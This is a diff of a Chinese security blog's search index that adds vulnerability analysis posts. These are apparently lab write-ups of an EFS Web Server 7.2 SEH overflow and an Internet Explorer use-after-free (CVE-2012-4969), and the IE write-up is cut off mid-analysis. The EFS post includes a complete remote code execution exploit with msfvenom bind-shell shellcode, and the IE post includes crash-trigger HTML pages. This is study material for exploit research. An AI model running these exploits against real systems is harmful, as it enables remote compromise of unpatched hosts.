@@ -1,10 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title></title>
-    <url>/2021/04/12/PCMan%20FTP%20Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="PCMan-FTP-Server缓冲区溢出CVE-2013-4730漏洞分析"><a href="#PCMan-FTP-Server缓冲区溢出CVE-2013-4730漏洞分析" class="headerlink" title="PCMan FTP Server缓冲区溢出CVE-2013-4730漏洞分析"></a>PCMan FTP Server缓冲区溢出CVE-2013-4730漏洞分析</h1><p>[toc]</p>
-<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
+    <title>PCMan FTP Server缓冲区溢出CVE-2013-4730漏洞分析</title>
+    <url>/2021/04/13/PCMan%20FTP%20Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
 <li>漏洞名称：PCMan FTP Server远程缓冲区溢出</li>
 <li>漏洞编号：CVE-2013-4730</li>
 <li>漏洞类型：缓冲区溢出</li>
@@ -12,6 +11,8 @@
 <li>利用难度：Easy</li>
 <li>详细信息：<a href="https://www.exploit-db.com/exploits/26471">https://www.exploit-db.com/exploits/26471</a></li>
 </ul>
+<span id="more"></span>
+
 <h3 id="2-软件概述"><a href="#2-软件概述" class="headerlink" title="2. 软件概述"></a>2. 软件概述</h3><p>PCMan FTP Server用于打开ftp服务，用于上传文件和管理有线及无线设备的软件</p>
 <h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
 <li><p>靶机环境：Windows xp sp3</p>
@@ -113,6 +114,13 @@
 <li><a href="https://www.cnblogs.com/cnsec/p/13286514.html">https://www.cnblogs.com/cnsec/p/13286514.html</a></li>
 </ul>
 ]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>栈溢出</tag>
+        <tag>漏洞分析</tag>
+      </tags>
   </entry>
   <entry>
     <title>Fastbin Attack之2017 0ctf babyheap</title>
@@ -258,7 +266,7 @@
 </ul>
 ]]></content>
       <categories>
-        <category>二进制安全</category>
+        <category>pwn</category>
       </categories>
       <tags>
         <tag>堆</tag>
@@ -431,5 +439,487 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>EFS Web Server 7.2远程代码执行漏洞分析</title>
+    <url>/2021/04/20/EFS-Web-Server-7-2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><ul>
+<li><p>漏洞软件：EFS Web Server 7.2 GET请求远程代码执行漏洞(SEH)</p>
+</li>
+<li><p>漏洞链接：<a href="https://www.exploit-db.com/exploits/42261">https://www.exploit-db.com/exploits/42261</a></p>
+</li>
+<li><p>软件下载：<a href="https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe">https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe</a></p>
+</li>
+<li><p>利用简述：利用SEH劫持程序执行流到shellcode，难度不大，适合学习windows的SEH漏洞利用</p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
+<li>靶机环境：Windows xp sp3<ul>
+<li>EFS Web Server 7.2</li>
+<li>windbg</li>
+<li>mona</li>
+</ul>
+</li>
+<li>攻击机环境：kali<ul>
+<li>pwntools</li>
+<li>metasploit</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-漏洞复现与分析"><a href="#2-漏洞复现与分析" class="headerlink" title="2. 漏洞复现与分析"></a>2. 漏洞复现与分析</h3><p>编写poc</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.112.146&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((ip, port))</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&quot;GET &quot;</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">20000</span>, <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用windbg附加漏洞程序，发送poc，触发漏洞</p>
+<img src="https://i.loli.net/2021/04/19/JyqaeKvX9k6hmbs.png" alt="image-20210418153647636" style="zoom:80%;" />
+
+<p>查看eax，eax+4c不可读，导致异常</p>
+<img src="https://i.loli.net/2021/04/19/m6G3tofeQiqwzbn.png" style="zoom:80%;" />
+
+<p>继续运行，eip指向了0x41414141，同时发现ecx也指向了0x41414141</p>
+<img src="https://i.loli.net/2021/04/20/gNoY7fJc2C4XLZj.png" alt="image-20210418153917690" style="zoom:80%;" />
+
+<p>查看栈</p>
+<img src="https://i.loli.net/2021/04/20/YlqARutXOypBfiP.png" alt="image-20210418154119141" style="zoom:80%;" />
+
+<p>栈回溯，分别跟踪查看61c277f6，61c6286c，004968EF</p>
+<p>用IDA打开sqlite3.dll，查看61c277f6，此处由于访问 eax+4cH 错误，导致异常，重点关注eax即a1，函数传参为a1且没有改变a1的值，所以应回溯上一个函数分析</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:61C277F6 81 78 4C 97 A6 29+cmp     dword ptr [eax+4Ch], 0A029A697h</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/20/kOTh8slbFdCZBXA.png" alt="image-20210418223736206" style="zoom:80%;" />
+
+<p>查看61c6286c后发现应当继续回溯，直到004968EF：因为调用sqlite3_prepare_v2()导致异常，继续回溯查看参数是什么，但是发现windbg上一层函数已被覆盖，应重新调试，在4968D0下断点</p>
+<img src="https://i.loli.net/2021/04/20/U7djOvkDQw9rWFK.png" alt="image-20210418224708060" style="zoom:80%;" />
+
+<p>在4968D0断下，逐步运行到004968ef，查看参数，第一个参数this指针为41414141，已经出现异常，需要继续回溯</p>
+<img src="https://i.loli.net/2021/04/20/FltwCgi5hesGTE8.png" alt="image-20210418231850935" style="zoom:80%;" />
+
+<p>但栈帧已被畸形数据覆盖，无法查看上一级函数，但是可以查看栈中保存的参数</p>
+<img src="https://i.loli.net/2021/04/20/LipWCG5yzBPUr8H.png" alt="image-20210419001344360" style="zoom: 80%;" />
+
+<p>关键字符串 select * from sqltable where name = ‘’sql语句，查找程序中调用这个字符串的函数</p>
+<img src="https://i.loli.net/2021/04/20/Elf3hSypePxm8z6.png" alt="image-20210419001805712" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/04/20/RB2IUTpVhlyXCOE.png" alt="image-20210419001857984" style="zoom:80%;" />
+
+<p>有两处调用目标字符串00497584、00497748，经排查后确定00497748地址为可疑函数</p>
+<img src="https://i.loli.net/2021/04/20/CUBYHcuTmF9MI5h.png" alt="image-20210419002434425" style="zoom:80%;" />
+
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(&amp;v15, aSelectFromSWhe, Sqltable, v11, a3);</span><br><span class="line">(<span class="keyword">int</span> __thiscall) <span class="built_in">sub_4968D0</span>(v4, (<span class="keyword">int</span>)&amp;v12, (<span class="keyword">int</span>)&amp;v15);</span><br></pre></td></tr></table></figure>
+
+<p>sprintf 函数将格式化后的sql语句存放进栈上的地址v15即01ba5fd4，其中SQL语句保存畸形字符串a3的内容</p>
+<p>在windbg中查看sub_4968D0的参数，thiscall调用约定中this保存在ecx</p>
+<p>v4 = ecx，&amp;v12 = esp，&amp;v15 = esp+4，此时ecx即01ba7058的地址为畸形字符串，这是由于v15保存的内容覆盖而致</p>
+<img src="https://i.loli.net/2021/04/20/qVd63TEQFrcCuxs.png" alt="image-20210419004214855" style="zoom: 80%;" />
+
+<img src="https://i.loli.net/2021/04/20/8klcI1Dgdj7uWpL.png" alt="image-20210419004016087" style="zoom:80%;" />
+
+<p>查看sub_4968D0中sqlite3_prepare_v2函数的参数</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sqlite3_prepare_v2</span><span class="params">(*<span class="keyword">this</span>, a3, <span class="number">-1</span>, (<span class="keyword">int</span>)&amp;a3, <span class="number">0</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/20/byLxYRmUvpqNZ5u.png" alt="image-20210419004746863" style="zoom:80%;" />
+
+<p>可以看到第一个参数为畸形字符串，在调用sqlite3_prepare_v2函数之前在004968ec将ecx内的值传递给第一个参数，ecx是sub_4968D0传递给sqlite3_prepare_v2的，值为01ba7058</p>
+<img src="https://i.loli.net/2021/04/20/ujHAYo7R2JDXVrE.png" alt="image-20210419005135224" style="zoom:80%;" />
+
+<p>继续执行直到触发漏洞，可以得知ecx指向的地址01ba7058保存的是关键内容，前面分析得知程序在00497748处调用sprintf函数将畸形字符串赋值给了v15指向的01ba5fd4一直覆盖到了01ba7058，覆盖了ecx原本关键指针的内容，导致漏洞</p>
+<p>漏洞原因总结：在sql语句赋值，由于没有对参数进行有效的检查，导致ecx指针对应的内容被sql语句中畸形变量覆盖，后续对ecx指针内容访问时出现了访问地址异常，进入SEH异常处理流程，导致代码执行</p>
+<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1. 背景知识"></a>1. 背景知识</h3><p>SEH即Windows结构化异常处理程序，用于处理程序发生的错误或异常，SEH结构存放在栈中，多个 SEH 通过链表指针在栈内由栈顶向栈底串成单向链表，发生异常时，程序顺着最近的SEH链表依次尝试其他异常处理函数，这里引用《0day安全》中的图</p>
+<img src="https://i.loli.net/2021/04/20/mpT1Qg76MAuxner.png" alt="image-20210419231727911" style="zoom:80%;" />
+
+<p>当程序执行异常处理函数时，函数创建自己的栈帧，会把next SEH的地址压入栈中，正好时esp+8的位置，那么我们劫持程序执行流方法为把异常处理函数改为pop_pop_ret的gadget，执行之后会跳转到next_seh处执行，将next_seh的值改为跳转到shellcode的代码，即可实现程序处理异常时执行shellcode的目的。这种攻击方法能够绕过SafeSEH。有关SEH攻击的内容可参考《0day安全》的第6.1和11章</p>
+<img src="https://i.loli.net/2021/04/20/XcUEz28SNC7Zj9u.png" alt="image-20210419234650285" style="zoom:80%;" />
+
+<h3 id="2-利用流程"><a href="#2-利用流程" class="headerlink" title="2. 利用流程"></a>2. 利用流程</h3><p>exploit整体思路：程序触发异常后跳转到handler后执行pop_pop_ret，跳转到NSEH执行jmp2shellcode，进而执行shelldcode</p>
+<img src="https://i.loli.net/2021/04/20/tLCRUo9Gapvq1KT.png" alt="image-20210419234820696" style="zoom:80%;" />
+
+<p>写exploit步骤</p>
+<p>发送最初的poc，查看seh链，确定seh的位置4061</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!exchain</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/20/AIrY4E6P238jUcW.png" alt="image-20210419163918885" style="zoom:80%;" />
+
+<p>使用mona插件在内存中寻找用于攻击seh的gadget，pop_pop_ret</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona seh</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/20/Fce9VMjwEamdstR.png" alt="image-20210419123938830" style="zoom:80%;" />
+
+<p>选择一个可执行的地址0x100103fe，编写exploit的雏形</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.112.146&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((ip, port))</span><br><span class="line"></span><br><span class="line">nseh = <span class="string">&quot;NSEH&quot;</span></span><br><span class="line">pop_pop_ret = <span class="number">0x100103fe</span></span><br><span class="line">shellcode = <span class="string">&#x27;B&#x27;</span>*<span class="number">8000</span></span><br><span class="line">payload = flat(<span class="string">&quot;GET &quot;</span>, cyclic(<span class="number">4061</span>), nseh, pop_pop_ret, shellcode, <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">1024</span>) </span><br></pre></td></tr></table></figure>
+
+<p>发送exploit可以看到seh链的nseh指针指向了”NESH”，seh handler指向了0x100103fe</p>
+<img src="https://i.loli.net/2021/04/20/gfM461oIazUPWHn.png" alt="image-20210419124137558" style="zoom:80%;" />
+
+<p>在0x100103fe处设置断点，使进程运行到断点处，会执行pop esi，pop edi，ret三条语句，返回到01bafd4即NESH</p>
+<img src="https://i.loli.net/2021/04/20/LqDuQaEo5G1YBPr.png" alt="image-20210419124316451" style="zoom:80%;" />
+
+<p>使NSEH跳转到shellcode，jmp 0x12 = \xeb\x12</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nesh = <span class="string">&quot;\xeb\x12\x90\x90&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>排除坏字符：”\x20\x2b\x2f\x5c” 分别为 “ +/\”，可能这些字符在创建sql语句时进行了特殊处理</p>
+<p>生成shellcode</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp LPORT=4444 -b &#x27;\x00\x20\x2b\x2f\x5c&#x27;  -n 0x20 -f py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.112.146&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect = s.connect((ip, port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -p windows/shell_bind_tcp LPORT=4444 -b &#x27;\x00\x20\x2b\x2f\x5c&#x27; -n 0x20 -f py</span></span><br><span class="line">buf =  <span class="string">b&quot;\x90&quot;</span>*<span class="number">0xc</span></span><br><span class="line">buf += <span class="string">b&quot;\xf9\x92\x4a\xf9\x41\xfc\x9b\x9b\x92\x4a\x48\xf9\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x90\x4a\x37\x41\x37\x98\x91\x49\x41\x4b\x91\x93&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf5\xfd\x43\x48\x90\x27\xda\xc1\xbd\xa1\x9e\x47\x62&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53\x83\xc2\x04\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6a\x13\x03\xcb\x8d\xa5\x97\xf7\x5a\xab\x58\x07\x9b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xcc\xd1\xe2\xaa\xcc\x86\x67\x9c\xfc\xcd\x25\x11\x76&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x83\xdd\xa2\xfa\x0c\xd2\x03\xb0\x6a\xdd\x94\xe9\x4f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7c\x17\xf0\x83\x5e\x26\x3b\xd6\x9f\x6f\x26\x1b\xcd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x38\x2c\x8e\xe1\x4d\x78\x13\x8a\x1e\x6c\x13\x6f\xd6&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x8f\x32\x3e\x6c\xd6\x94\xc1\xa1\x62\x9d\xd9\xa6\x4f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x57\x52\x1c\x3b\x66\xb2\x6c\xc4\xc5\xfb\x40\x37\x17&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x3c\x66\xa8\x62\x34\x94\x55\x75\x83\xe6\x81\xf0\x17&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x40\x41\xa2\xf3\x70\x86\x35\x70\x7e\x63\x31\xde\x63&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x72\x96\x55\x9f\xff\x19\xb9\x29\xbb\x3d\x1d\x71\x1f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5f\x04\xdf\xce\x60\x56\x80\xaf\xc4\x1d\x2d\xbb\x74&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7c\x3a\x08\xb5\x7e\xba\x06\xce\x0d\x88\x89\x64\x99&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa0\x42\xa3\x5e\xc6\x78\x13\xf0\x39\x83\x64\xd9\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd7\x34\x71\xd7\x57\xdf\x81\xd8\x8d\x4a\x89\x7f\x7e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x69\x74\x3f\x2e\x2d\xd6\xa8\x24\xa2\x09\xc8\x46\x68&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\x61\xbb\x93\x5d\x2e\x32\x75\x37\xde\x12\x2d\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x1c\x41\xe6\x48\x5e\xa3\x5e\xfe\x17\xa5\x59\x01\xa8&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe3\xcd\x95\x23\xe0\xc9\x84\x33\x2d\x7a\xd1\xa4\xbb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xeb\x90\x55\xbb\x21\x42\xf5\x2e\xae\x92\x70\x53\x79&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc5\xd5\xa5\x70\x83\xcb\x9c\x2a\xb1\x11\x78\x14\x71&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xce\xb9\x9b\x78\x83\x86\xbf\x6a\x5d\x06\x84\xde\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x51\x52\x88\xf7\x0b\x14\x62\xae\xe0\xfe\xe2\x37\xcb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc0\x74\x38\x06\xb7\x98\x89\xff\x8e\xa7\x26\x68\x07&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd0\x5a\x08\xe8\x0b\xdf\x38\xa3\x11\x76\xd1\x6a\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xca\xbc\x8c\x3f\x08\xb9\x0e\xb5\xf1\x3e\x0e\xbc\xf4&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7b\x88\x2d\x85\x14\x7d\x51\x3a\x14\x54&quot;</span></span><br><span class="line"></span><br><span class="line">nseh = <span class="string">b&quot;\xeb\x12\x90\x90&quot;</span>  <span class="comment">#jmp 0x12</span></span><br><span class="line">pop_pop_ret = <span class="number">0x100103fe</span>    <span class="comment">#pop pop ret ImageLoad.dll (WinXP SP3)</span></span><br><span class="line">buf += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">8000</span> 		<span class="comment">#确保payload足够以长触发漏洞</span></span><br><span class="line">payload = flat(<span class="string">&quot;GET &quot;</span>, cyclic(<span class="number">4061</span>), nseh, pop_pop_ret, buf, <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure>
+
+<p>发送payload，攻击成功</p>
+<img src="https://i.loli.net/2021/04/20/ziNX3VkbFBd1QG8.png" alt="image-20210419154925886" style="zoom:80%;" />
+
+<p>个人总结：</p>
+<p>逆向漏洞的时候应一级一级的回溯，如果发现无法继续向前回溯，可以在能回溯的最后一级查看寄存器栈等参数寻找有用信息，比如关键字符串。漏洞利用过程主要学习了seh，在排除坏字符的时候发现了很多问题，原因的sql语句将payload中一部分内容进行了处理，所以这里需要结合更多知识进行思考。</p>
+<h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
+<li><p><a href="https://www.freebuf.com/articles/system/170703.html">https://www.freebuf.com/articles/system/170703.html</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/u012763794/article/details/66970749">https://blog.csdn.net/u012763794/article/details/66970749</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>远程代码执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2012-4969漏洞分析</title>
+    <url>/2021/04/28/CVE-2012-4969%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
+<li><p>漏洞编号：CVE-2012-4969</p>
+</li>
+<li><p>漏洞类型：UAF</p>
+</li>
+<li><p>漏洞影响：远程代码执行</p>
+</li>
+<li><p>CVSS分数：9.3</p>
+</li>
+<li><p>概述：mshtml.dll的CMshtmlEd :: Exec()函数将CMshtmlEd对象释放后，又再次使用相同的内存，从而导致释放后使用的情况</p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2. 漏洞影响"></a>2. 漏洞影响</h3><p>Internet Explorer 6 至 9</p>
+<h3 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h3><p><a href="http://go.microsoft.com/fwlink/?linkid=255505">MS12-063</a></p>
+<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
+<li>靶机环境版本<ul>
+<li>win7 sp1 x86</li>
+</ul>
+</li>
+<li>靶机配置<ul>
+<li>IE 8</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2. 复现过程"></a>2. 复现过程</h3><p>使用<a href="https://www.rapid7.com/db/modules/exploit/windows/browser/ie_execcommand_uaf/">metastploit模块</a>获取poc1，LLmya.html</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> arrr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        arrr[<span class="number">0</span>] = <span class="built_in">window</span>.document.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">        arrr[<span class="number">0</span>][<span class="string">&quot;src&quot;</span>] = <span class="string">&quot;E&quot;</span>;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;iframe src=<span class="string">&quot;./UGuQTe.html&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>poc2，UGuQTe.html，两个文件保存在同一个目录下</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcB</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">document</span>.execCommand(<span class="string">&quot;selectAll&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcA</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">document</span>.write(<span class="string">&quot;O&quot;</span>);</span><br><span class="line">      parent.arrr[<span class="number">0</span>].src = <span class="string">&quot;YMjf\u0c08\u0c0cKDogjsiIejengNEkoPDjfiJDIWUAzdfghjAAuUFGGBSIPPPUDFJKSOQJGH&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;body onload=<span class="string">&#x27;funcB();&#x27;</span> onselect=<span class="string">&#x27;funcA()&#x27;</span>&gt;</span><br><span class="line">    &lt;div contenteditable=<span class="string">&#x27;true&#x27;</span>&gt;</span><br><span class="line">      a</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行程序poc1，触发漏洞</p>
+<img src="https://i.loli.net/2021/04/28/SqYwjWOAFfga5tG.png" style="zoom:80%;" />
+
+<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul>
+<li>漏洞文件：mshtml.dll</li>
+<li>漏洞函数：mshtml!CMshtmlEd::Exec</li>
+<li>漏洞对象：CMshtmlEd</li>
+</ul>
+<h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h3><h4 id="漏洞函数分析"><a href="#漏洞函数分析" class="headerlink" title="漏洞函数分析"></a>漏洞函数分析</h4><p>设置hpa，ust堆调试属性，使用windbg调试IE浏览器，执行poc1，漏洞触发</p>
+<img src="https://i.loli.net/2021/04/28/13fTuF62Ysmbdqc.png" style="zoom:80%;" />
+
+<p>查看edi的值</p>
+<img src="https://i.loli.net/2021/04/28/mquAWDSOBjeQ3sI.png" style="zoom:80%;" />
+
+<p>查看函数调用堆栈</p>
+<img src="https://i.loli.net/2021/04/28/gGW9eJlAZ8cEw14.png" style="zoom:80%;" />
+
+<p>IDA中反汇编函数CMshtmlEd::Exec，由于win7中打开了ASLR，所以只能靠地址的后两个字节定位漏洞触发点68b8503e。这里是edi地址引用错误，在函数中往前查看edi的赋值情况，edi只有一次赋值且为this指针（不排除中间函数更改edi的可能，需要动态调试验证）</p>
+<img src="https://i.loli.net/2021/04/28/vtwTVmWeHfqEBSU.png" style="zoom:80%;" />
+
+<p>在CMshtmlEd::Exec设置断点，单步执行查看edi的变化情况</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bp mshtml!CMshtmlEd::Exec</span><br></pre></td></tr></table></figure>
+
+<p>edi第一次赋值，查看堆的结构，得知edi指向CMshtmlEd实例的虚表</p>
+<img src="https://i.loli.net/2021/04/28/ENT2Pa7Y6cb8oZI.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/04/28/PqcTeFpbQ4xAMzL.png" style="zoom:80%;" />
+
+<p>继续执行到触发异常点，edi还是指向同一个地方，但是!heap -p -a edi已经没有输出了，说明edi指向的堆已经不存在，大概率为释放后重利用漏洞</p>
+<img src="https://i.loli.net/2021/04/28/dMGswOgaxYC6oDN.png" style="zoom:80%;" />
+
+<p>下一步查看CMshtmlEd实例的释放过程，先找到与CMshtmlEd类有关的函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x mshtml!CmshtmlEd::*</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/04/28/Luk8OHGdIZCS3Jm.png" style="zoom:80%;" />
+
+<p>重点关注的函数</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">CMshtmlEd::Release</span><br><span class="line">CMshtmlEd::~CMshtmlEd</span><br></pre></td></tr></table></figure>
+
+<p>不过析构函数一般是与free一起调用的，查看CMshtmlEd::~CMshtmlEd，发现由CMshtmlEd::Release调用，查看release，有一处跳转执行free，所以就在CMshtmlEd::Release下断点</p>
+<img src="https://i.loli.net/2021/04/28/98Avw2hXiVaWsq7.png" style="zoom:80%;" />
+
